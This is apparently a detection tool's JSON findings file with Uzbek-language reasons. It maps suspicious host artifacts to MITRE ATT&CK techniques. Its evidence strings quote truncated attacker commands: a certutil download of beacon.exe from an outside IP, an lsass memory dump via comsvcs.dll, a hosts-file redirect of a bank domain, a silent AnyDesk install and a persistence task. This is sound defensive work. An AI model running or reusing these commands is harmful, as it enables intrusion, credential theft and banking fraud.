@@ -1,0 +1,179 @@
+{
+  "findings": [
+    {
+      "category": "remote_access_tools",
+      "item": "AnyDesk",
+      "score": 0.8,
+      "confidence": "high",
+      "techniques": [
+        {
+          "id": "T1219"
+        }
+      ],
+      "reasons": [
+        "log korrelyatsiyasi: anydesk (BUX-PC05 bux.aziza 2026-10-05T09:25:14 AnyDesk.exe --silent --start-service)",
+        "log: shu texnika kuzatilgan"
+      ],
+      "protected": false,
+      "log_confirmed": true
+    },
+    {
+      "category": "hosts_file",
+      "item": "91.238.50.10 ibank.example.uz",
+      "score": 0.8,
+      "confidence": "high",
+      "techniques": [
+        {
+          "id": "T1565.001"
+        }
+      ],
+      "reasons": [
+        "log korrelyatsiyasi: 91.238.50.10 ibank.example.uz (BUX-PC05 bux.aziza 2026-10-05T09:28:40 cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C)",
+        "log: shu texnika kuzatilgan"
+      ],
+      "protected": false,
+      "log_confirmed": true
+    },
+    {
+      "category": "connections",
+      "item": "45.142.212.61:443 (beacon.exe)",
+      "score": 0.8,
+      "confidence": "high",
+      "techniques": [
+        {
+          "id": "T1071.001"
+        }
+      ],
+      "reasons": [
+        "log korrelyatsiyasi: 45.142.212.61 (IOC: 45.142.212.61)"
+      ],
+      "protected": false,
+      "log_confirmed": true
+    },
+    {
+      "category": "tasks",
+      "item": "Updater",
+      "score": 0.6,
+      "confidence": "high",
+      "techniques": [
+        {
+          "id": "T1053.005"
+        }
+      ],
+      "reasons": [
+        "shubhali papka",
+        "log korrelyatsiyasi: Updater (HR-PC01 hr.olim 2026-10-05T09:07:10 schtasks /create /sc onlogon /tn Updater /tr C:\\Us)",
+        "log: shu texnika kuzatilgan"
+      ],
+      "protected": false,
+      "log_confirmed": true
+    },
+    {
+      "category": "autoruns",
+      "item": "Updater",
+      "score": 0.6,
+      "confidence": "high",
+      "techniques": [
+        {
+          "id": "T1547.001"
+        }
+      ],
+      "reasons": [
+        "shubhali papka",
+        "log korrelyatsiyasi: Updater (HR-PC01 hr.olim 2026-10-05T09:07:10 schtasks /create /sc onlogon /tn Updater /tr C:\\Us)",
+        "log: shu texnika kuzatilgan"
+      ],
+      "protected": false,
+      "log_confirmed": true
+    },
+    {
+      "category": "users",
+      "item": "Administrator",
+      "score": 0.35,
+      "confidence": "med",
+      "techniques": [
+        {
+          "id": "T1078.003"
+        }
+      ],
+      "reasons": [
+        "admin akkaunt (baseline yo'q \u2014 tekshiring)"
+      ],
+      "protected": false
+    },
+    {
+      "category": "users",
+      "item": "checker_admin",
+      "score": 0.35,
+      "confidence": "med",
+      "techniques": [
+        {
+          "id": "T1078.003"
+        }
+      ],
+      "reasons": [
+        "admin akkaunt (baseline yo'q \u2014 tekshiring)"
+      ],
+      "protected": false
+    },
+    {
+      "category": "users",
+      "item": "admin",
+      "score": 0.35,
+      "confidence": "med",
+      "techniques": [
+        {
+          "id": "T1078.003"
+        }
+      ],
+      "reasons": [
+        "admin akkaunt (baseline yo'q \u2014 tekshiring)"
+      ],
+      "protected": false
+    }
+  ],
+  "extra": {
+    "unmatched_log_artifacts": [
+      {
+        "artifact": "C:\\Windows\\System32\\rundll32.exe",
+        "type": "file",
+        "evidence": "HR-PC01 hr.olim 2026-10-05T09:14:05 C:\\Windows\\System32\\rundll32.exe comsvcs.dll, Mini"
+      },
+      {
+        "artifact": "C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe",
+        "type": "file",
+        "evidence": "HR-PC01 hr.olim 2026-10-05T09:02:20 certutil.exe -urlcache -split -f http://45.142.212"
+      },
+      {
+        "artifact": "C:\\Windows\\Temp\\lsass.dmp",
+        "type": "file",
+        "evidence": "HR-PC01 hr.olim 2026-10-05T09:14:05 C:\\Windows\\System32\\rundll32.exe comsvcs.dll, Mini"
+      },
+      {
+        "artifact": "beacon.exe",
+        "type": "file",
+        "evidence": "HR-PC01 hr.olim 2026-10-05T09:02:20 certutil.exe -urlcache -split -f http://45.142.212"
+      },
+      {
+        "artifact": "rundll32.exe",
+        "type": "file",
+        "evidence": "HR-PC01 hr.olim 2026-10-05T09:14:05 C:\\Windows\\System32\\rundll32.exe comsvcs.dll, Mini"
+      },
+      {
+        "artifact": "dclist:corp.local",
+        "type": "file",
+        "evidence": "HR-PC01 hr.olim 2026-10-05T09:12:20 nltest /dclist:corp.local"
+      },
+      {
+        "artifact": "lsass.dmp",
+        "type": "file",
+        "evidence": "HR-PC01 hr.olim 2026-10-05T09:14:05 C:\\Windows\\System32\\rundll32.exe comsvcs.dll, Mini"
+      }
+    ],
+    "checker_candidates": [
+      "10.10.20.51",
+      "172.16.9.9",
+      "10.10.20.60"
+    ]
+  }
+}
